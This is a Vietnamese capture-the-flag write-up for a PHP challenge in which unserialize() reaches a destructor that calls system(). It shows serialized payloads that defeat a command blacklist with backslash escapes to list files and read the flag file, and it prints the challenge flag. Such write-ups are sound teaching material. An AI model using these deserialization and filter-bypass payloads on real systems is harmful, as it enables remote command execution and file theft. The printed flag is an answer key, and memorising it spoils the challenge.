# faster
## Description
bạn có thể nhanh hơn throw Exception() không?  
`http://45.122.249.68:10019`

## Solution
Ta có source code sau:  

```php
<?php
class exploit_me
{
    public $cmd;
    public function __destruct(){
        system($this->cmd);
    }
}
if ($payload[0]==='a' || $payload[0]==='C')
{
    die('awwwww! this\'s the wrong way!');
}
else if (preg_match('/cat|ls|nl|head|less|more|tail|mv|base|grep|dir|\*|strings|sort|txt|find|print|tac|awk/is',$payload))
    die('awwwww! this\'s the wrong way!');
unserialize($payload);
throw new Exception("oh nooooooo!!!");
?>
```

Ở đây, ta thấy rằng, chương trình sẽ `die` nếu kí tự đầu của payload là `a` hoặc `C`. Đồng thời, nếu trong payload có chứa các từ trong `preg_match` (case-insensitive) thì chương trình cũng sẽ `die`.  

Thứ hai, ta thấy rằng có 1 class `exploit_me` và object được tạo từ class này sẽ thực thi `system($this->cmd)` khi được deserialize. Vậy ta sẽ tạo 1 chuỗi deserialize trong `php` trên class `exploit_me` với `cmd` là một câu lệnh linux để đọc flag.  

Để bypass được blacklist trong `preg_match`, ta có thể tận dụng escape character trong linux. Nghĩa là khi ta dùng `\'` thì linux sẽ xem `'` này là một ký tự dấu nháy đơn thông thường chứ không phải là dấu hiệu bắt đầu hoặc kết thúc chuỗi. Tương tự khi ta dùng `\ ` thì linux sẽ xem ` ` là 1 dấu cách thông thường của một chuỗi chứ không phải là ký tự ngăn cách các tham số của command.  

Với các thông tin trên, ta có thể dùng `l\s` thay vì `ls` để list các file và directory ở đường dẫn hiện tại.  

![image](https://user-images.githubusercontent.com/44528004/147436215-10f63555-0746-4fe2-a970-c80fbcbe252c.png)  

Từ đây, ta tạo serialized string sau:  
```
O:10:"exploit_me":1:{s:3:"cmd";s:3:"l\s";}
```  

Truyền payload:  

![image](https://user-images.githubusercontent.com/44528004/147436316-cf644450-cd90-466a-915f-bce9ae30cc6d.png)

Có thể thấy là cách khai thác này thành công. Từ đây, ta có thể thực thi các câu lệnh như `cat`, `ls` thông thường sử dụng escape character để bypass blacklist và tìm file flag.

Payload exploit thành công:
```
O:10:"exploit_me":1:{s:3:"cmd";s:34:"ca\t ../../../a8749209e3d652e_flag";}
```

Flag: `Wanna.One{Fast_detruct_is_tooooooooo_easy_for_you_!!!}`
